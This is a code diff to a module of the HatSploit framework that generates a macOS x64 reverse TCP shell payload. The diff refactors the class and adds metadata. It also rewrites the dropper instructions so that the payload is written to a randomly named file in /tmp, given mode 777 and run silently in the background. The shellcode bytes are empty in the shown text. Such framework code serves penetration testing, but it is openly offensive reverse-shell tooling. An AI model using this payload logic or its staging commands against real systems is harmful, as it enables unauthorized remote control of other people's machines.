@@ -24,16 +24,15 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
+from utils.payload.payload import PayloadGenerator
+from utils.tcp.tcp import TCPClient
+from utils.string.string import StringTools
 
-from utils.tcp.tcp import tcp
-from utils.payload.payload_generator import payload_generator
 
-class HatSploitPayload(HatSploitPayload):
-    tcp = tcp()
-    payload_generator = payload_generator()
-
+class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
     details = {
+        'Category': "stager",
         'Name': "macOS x64 Shell Reverse TCP",
         'Payload': "macos/x64/shell_reverse_tcp",
         'Authors': [
@@ -46,6 +45,7 @@ class HatSploitPayload(HatSploitPayload):
         'Comments': [
             ''
         ],
+        'Architecture': "x64",
         'Platform': "macos",
         'Risk': "high",
         'Type': "reverse_tcp"
@@ -54,7 +54,7 @@ class HatSploitPayload(HatSploitPayload):
     options = {
         'LHOST': {
             'Description': "Local host.",
-            'Value': tcp.get_local_host(),
+            'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
@@ -73,27 +73,29 @@ class HatSploitPayload(HatSploitPayload):
     }
 
     def run(self):
-        local_host, local_port, executable_format = self.parser.parse_options(self.options)
+        local_host, local_port, executable_format = self.parse_options(self.options)
 
-        local_host = self.payload_generator.host_to_bytes(local_host)
-        local_port = self.payload_generator.port_to_bytes(local_port)
+        local_host = self.host_to_bytes(local_host)
+        local_port = self.port_to_bytes(local_port)
 
-        if not executable_format in self.payload_generator.formats.keys():
-            self.badges.output_error("Invalid executable format!")
+        if executable_format not in self.formats.keys():
+            self.output_error("Invalid executable format!")
             return
 
-        self.badges.output_process("Generating shellcode...")
+        self.output_process("Generating shellcode...")
         shellcode = (
             b""
         )
 
-        self.badges.output_process("Generating payload...")
-        payload = self.payload_generator.generate(executable_format, 'x64', shellcode)
+        self.output_process("Generating payload...")
+        payload = self.generate(executable_format, 'x64', shellcode)
+
+        filename = self.random_string()
 
         instructions = ""
-        instructions += "cat >/private/var/tmp/.payload;"
-        instructions += "chmod +x 777 /private/var/tmp/.payload;"
-        instructions += "sh -c '/private/var/tmp/.payload' 2>/dev/null &"
+        instructions += f"cat >/tmp/{filename};"
+        instructions += f"chmod 777 /tmp/{filename};"
+        instructions += f"sh -c '/tmp/{filename}' 2>/dev/null &"
         instructions += "\n"
 
         self.payload = payload
